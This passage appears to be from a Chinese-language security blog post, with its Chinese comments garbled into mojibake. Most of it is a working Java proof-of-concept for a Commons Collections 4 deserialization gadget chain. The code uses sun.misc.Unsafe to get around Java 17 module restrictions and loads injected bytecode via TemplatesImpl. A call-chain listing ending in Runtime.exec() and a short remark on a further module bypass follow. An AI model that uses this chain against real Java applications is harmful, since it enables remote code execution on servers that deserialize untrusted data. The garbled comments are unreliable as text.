</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC4_17</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">appClassLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">javassist</span><span class="p">.</span><span class="na">LoaderClassPath</span><span class="p">(</span><span class="n">appClassLoader</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;eval&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="c1">//è¿™é‡Œéšä¾¿ä¸€ä¸ªç±»å°±è¡Œï¼Œcode2å‡‘æ•°ç”¨çš„</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz2</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">CC4_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">aClass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">,</span><span class="n">code2</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_transletIndex&#34;</span><span class="p">,</span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">TrAXFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InstantiateTransformer</span><span class="w"> </span><span class="n">invokerTransformer5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InstantiateTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">templates</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getAndSetObject&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kt">long</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span class="p">),</span><span class="n">60</span><span class="p">,</span><span class="s">&#34;javax.xml&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;get&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;setAccessible&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">true</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformerClosure</span><span class="w"> </span><span class="n">transformerClosure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerClosure</span><span class="p">(</span><span class="n">invokerTransformer2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="p">(</span><span class="n">transformerClosure</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredField&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">ClosureTransformer</span><span class="p">,</span><span class="n">invokerTransformer3</span><span class="p">,</span><span class="n">invokerTransformer4</span><span class="p">,</span><span class="n">constantTransformer2</span><span class="p">,</span><span class="n">invokerTransformer5</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        patchModule(invokerTransformer.getClass(),aClass);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">invokerTransformer</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformingComparator</span><span class="w"> </span><span class="n">transformingComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="n">transformingComparator</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">CC4_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">getClass</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;size&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="è°ƒç”¨é“¾">è°ƒç”¨é“¾<a hidden class="anchor" aria-hidden="true" href="#è°ƒç”¨é“¾">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">heapify</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">siftDown</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">siftDownUsingComparator</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">TransformingComparator</span><span class="p">.</span><span class="na">compare</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">ConstantTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">     </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">è¿™é‡Œå¼€å§‹æ„é€ Unsafeå¯¹è±¡</span><span class="err">ï¼Œ</span><span class="n">å¾—åˆ°Filedå¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">ClosureTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">è¿™é‡Œå½¢æˆä¸€ä¸ªå²”è·¯</span><span class="err">ï¼Œ</span><span class="n">å»æ„é€ setAccessible</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">TransformerClosure</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">è¿™é‡Œæ‰§è¡ŒsetAccessible</span><span class="err">ï¼Œ</span><span class="n">ç„¶ååˆå›åˆ°ä¸»çº¿</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">     </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">æ‰§è¡Œget</span><span class="p">()</span><span class="err">ï¼Œ</span><span class="n">å¾—åˆ°Unsafeå¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">	   </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">æ‰§è¡ŒgetAndSetObject</span><span class="err">ï¼Œ</span><span class="n">ä¿®æ”¹pn</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ConstantTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">    </span><span class="o">---&gt;</span><span class="n">è¿™é‡Œå›åˆ°æ­£å¸¸CC4é“¾å­</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InstantiateTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">newInstance</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TrAXFilter</span><span class="err">#</span><span class="n">TrAXFilter</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">newTransformer</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">getTransletInstance</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">defineTransletClasses</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="nf">newInstance</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><h1 id="0x05-é—æ¼">0x05 é—æ¼<a hidden class="anchor" aria-hidden="true" href="#0x05-é—æ¼">#</a></h1>
<p>å†™æ–‡ç« çš„æ—¶å€™çœ‹ä»£ç è¶Šçœ‹è¶Šæ„Ÿè§‰æ¼æ‰äº†ä»€ä¹ˆï¼Œè¿˜è®°å¾—æˆ‘å‰é¢è¯´åˆ°çš„ä¸€ä¸ªåˆ©ç”¨å°è¯•<code>&quot;null&quot;</code>ï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘åˆ†æçš„æ—¶å€™ï¼ŒæŠŠmemberClassæƒ³æˆnulläº†ï¼Œå…¶å®ä¸æ˜¯ï¼Œæ˜¯<code>memberClass.getModule()</code>ä¸º<code>null</code></p>
<p>é‚£ä¹ˆæœ‰ç‚¹æ„Ÿè§‰äº†ä¹ˆå°‘å¹´ï¼Ÿæˆ‘tmç›´æ¥æŠŠè¿™ä¸¤ä¸ªçš„<code>Moudle</code>éƒ½ç”¨Unsafeæ”¹æˆ<code>null</code>å‘—ï¼Œç»è¿‡ä¿ºçš„æ”¹é€ ï¼ŒUnsafeå¯¹è±¡è°ƒç”¨ä¸¤æ¬¡å®Œå…¨ä¸æ˜¯é—®é¢˜å•Š</p>
